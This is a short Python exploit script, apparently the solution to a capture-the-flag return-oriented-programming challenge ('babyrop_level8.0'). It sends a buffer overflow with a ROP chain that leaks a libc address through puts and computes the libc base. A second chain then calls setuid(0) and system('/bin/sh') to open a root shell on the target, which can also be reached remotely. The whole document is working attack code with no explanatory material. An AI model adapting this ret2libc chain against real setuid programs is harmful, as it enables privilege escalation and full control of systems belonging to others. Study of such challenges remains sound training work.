#!/usr/bin/python3
from pwncus import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./babyrop_level8.0_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*challenge+384
c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

ret = 0x000000000040101a
pop_rdi = 0x0000000000401fd3


pl = flat(

cyclic(0x28),
ret,
pop_rdi,
exe.got.puts,
exe.plt.puts,
exe.sym.challenge+5,
)

p.send(pl)

p.recvuntil(b'Leaving!\n')
leak = u64(p.recvline()[:-1] + b'\0\0')
libc.address = leak - 0x84420
print(hex(leak))
print(hex(libc.address))


pl = flat(
cyclic(0x28),
ret,
pop_rdi,
0,
libc.sym.setuid,
ret,
pop_rdi,
next(libc.search(b'/bin/sh')),
libc.sym.system,

)

p.send(pl)

p.interactive()


